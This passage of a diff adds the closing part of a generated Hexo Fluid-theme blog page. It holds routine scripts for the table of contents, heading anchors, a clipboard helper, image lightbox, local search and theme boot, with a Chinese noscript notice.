+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/5.0.0/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
